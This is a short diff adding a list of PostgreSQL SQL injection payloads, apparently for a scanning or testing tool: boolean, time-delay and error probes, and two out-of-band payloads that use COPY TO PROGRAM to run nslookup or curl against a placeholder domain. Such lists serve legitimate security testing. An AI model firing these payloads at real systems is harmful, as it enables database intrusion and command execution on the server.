@@ -1,0 +1,8 @@
+# PostgreSQL-specific SQL injection payloads
+
+boolean_true_payload: "' OR 'x'='x'--"
+boolean_false_payload: "' OR 'x'='y'--"
+time_delay_payload: "' OR pg_sleep(3)--"
+error_probe_payload: "'"
+oob_dns_payload: "'; COPY (SELECT '') TO PROGRAM 'nslookup your-domain.com'--"
+oob_http_payload: "'; COPY (SELECT '') TO PROGRAM 'curl http://your-domain.com'--"
